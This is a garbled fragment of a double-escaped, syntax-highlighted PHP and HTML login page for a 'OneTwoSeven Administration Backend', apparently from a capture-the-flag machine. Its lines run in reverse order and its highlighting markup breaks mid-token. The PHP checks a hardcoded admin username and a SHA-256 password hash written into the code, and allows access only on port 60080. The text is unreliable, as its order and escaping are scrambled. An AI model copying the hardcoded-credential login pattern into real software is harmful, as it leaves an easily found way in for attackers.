-         &lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/login.php&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-      
-      &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class =&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;container&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-      
-      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- /container --&amp;gt;&lt;/span&gt;
-         ?&amp;gt;
-            }
-              }
-    				      
-		   
-	      if ($_POST['username'] == 'ots-admin' &lt;span class=&quot;err&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; hash('sha256',$_POST['password']) == '11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8') {
-            if (isset($_POST['login']) &lt;span class=&quot;err&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; !empty($_POST['username']) &lt;span class=&quot;err&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; !empty($_POST['password'])) {
-            
-            $msg = '';
-          &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
-        &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h2&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;=&quot;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;featurette&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;heading&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;Login to the kingdom.&amp;lt;span class=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;muted&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt; Up up and away!&amp;lt;/span&amp;gt;&amp;lt;/h2&amp;gt;
-      &amp;lt;div class=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;col&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;md&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
-    &amp;lt;div class=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;row&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;featurette&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
-    &amp;lt;!-- START THE FEATURETTES --&amp;gt;
-  &amp;lt;div class=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;container&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;marketing&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
-  &amp;lt;!-- Wrap the rest of the page in another container to center all the content. --&amp;gt;
-  ================================================== --&amp;gt;
-  &amp;lt;!-- Marketing messaging and featurettes
-  &amp;lt;/div&amp;gt;
-    &amp;lt;/a&amp;gt;
-      &amp;lt;span class=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;only&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;Next&amp;lt;/span&amp;gt;
-      &amp;lt;span class=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;carousel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;control&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;icon&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; aria-hidden=&quot;&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;&amp;lt;/span&amp;gt;
-    &amp;lt;a class=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;carousel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;control&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; href=&quot;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#myCarousel&quot; role=&quot;button&quot; data-slide=&quot;next&quot;&amp;gt;
-&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-      &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;span&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;=&quot;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;sr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;only&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;Previous&amp;lt;/span&amp;gt;
-      &amp;lt;span class=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;carousel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;control&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;prev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;icon&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; aria-hidden=&quot;&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;&amp;lt;/span&amp;gt;
-    &amp;lt;a class=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;carousel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;control&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;prev&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; href=&quot;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#myCarousel&quot; role=&quot;button&quot; data-slide=&quot;prev&quot;&amp;gt;
-&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-      &lt;span class=&quot;o&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;o&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-          &lt;span class=&quot;o&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-            &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Administration&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;backend&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;For&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;administrators&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;only&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-            &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;OneTwoSeven&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Administration&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-          &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;=&quot;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;carousel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;caption&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;left&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
-        &amp;lt;div class=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;container&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
-        &amp;lt;img src=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;img&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ai&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;codes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;coding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;97077.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;jpg&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
-      &amp;lt;div class=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;carousel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;active&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
-    &amp;lt;div class=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;carousel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inner&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
-    &amp;lt;/ol&amp;gt;
-      &amp;lt;li data-target=&quot;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#myCarousel&quot; data-slide-to=&quot;0&quot; class=&quot;active&quot;&amp;gt;&amp;lt;/li&amp;gt;
-&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ol&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;=&quot;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;carousel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;indicators&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
-  &amp;lt;div id=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;myCarousel&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; class=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;carousel&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;slide&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; data-ride=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;carousel&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
-&amp;lt;main role=&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
-&amp;lt;/header&amp;gt;
-  &amp;lt;/nav&amp;gt;
-    &amp;lt;/div&amp;gt;
-    &amp;lt;div class=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;collapse&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;navbar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;collapse&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; id=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;navbarCollapse&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
-    &amp;lt;/button&amp;gt;
-      &amp;lt;span class=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;navbar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toggler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;icon&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;&amp;lt;/span&amp;gt;
-    &amp;lt;button class=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;navbar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toggler&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; type=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;button&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; data-toggle=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;collapse&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; data-target=&quot;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#navbarCollapse&quot; aria-controls=&quot;navbarCollapse&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&amp;gt;
-&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;=&quot;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;navbar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;brand&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; href=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;OneTwoSeven - Administration Backend&amp;lt;/a&amp;gt;
-  &amp;lt;nav class=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;navbar&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;navbar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;expand&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;md&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;navbar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dark&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fixed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;top&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dark&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
-    &amp;lt;header&amp;gt;
-  &amp;lt;body&amp;gt;
-  &amp;lt;/head&amp;gt;
-    &amp;lt;link href=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;carousel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;css&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; rel=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stylesheet&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
-    &amp;lt;!-- Custom styles for this template --&amp;gt;
-    &amp;lt;/style&amp;gt;
-      @media (min-width: 768px) { .bd-placeholder-img-lg { font-size: 3.5rem; } }
-      .bd-placeholder-img { font-size: 1.125rem; text-anchor: middle; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; }
-    &amp;lt;style&amp;gt;
-    &amp;lt;link href=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;css&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bootstrap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;min&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;css&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; rel=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stylesheet&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; crossorigin=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;anonymous&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
-    &amp;lt;!-- Bootstrap core CSS --&amp;gt;
-    &amp;lt;title&amp;gt;OneTwoSeven&amp;lt;/title&amp;gt;
-    &amp;lt;meta name=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;generator&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; content=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Jekyll&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;8.5&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
-    &amp;lt;meta name=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;author&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; content=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Mark&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Otto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Jacob&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Thornton&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Bootstrap&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;contributors&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
-    &amp;lt;meta name=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; content=&quot;&quot;&amp;gt;
-    &amp;lt;meta name=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;viewport&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; content=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;device&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;initial&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;scale&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;shrink&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;no&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
-    &amp;lt;meta charset=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;utf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
-  &amp;lt;head&amp;gt;
-&amp;lt;html lang=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;en&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
-&amp;lt;!doctype html&amp;gt;
-&amp;lt;?php session_start(); if (isset (&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SESSION['username']&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)) { header(&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;menu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;); } ?&amp;gt;
-&amp;lt;?php if ( &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER['SERVER_PORT']&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; != 60080 ) { die(); } ?&amp;gt;
-&amp;lt;/html&amp;gt;
-      &amp;lt;script&amp;gt;window.jQuery || document.write('&amp;lt;script src=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;docs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;4.3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;assets&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;js&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;vendor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;jquery&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;slim&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;min&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;js&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;&amp;lt;\/script&amp;gt;')&amp;lt;/script&amp;gt;&amp;lt;script src=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;js&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bootstrap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bundle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;min&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;js&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; crossorigin=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;anonymous&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;/body&amp;gt;
-&amp;lt;script src=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;://&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;jquery&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;com&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;jquery&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;3.3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;slim&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;min&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;js&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; integrity=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sha384&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;q8i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;X&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;965&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;abtTE1Pi6jizo&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; crossorigin=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;anonymous&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;&amp;lt;/script&amp;gt;
-&amp;lt;/main&amp;gt;
-  &amp;lt;/footer&amp;gt;
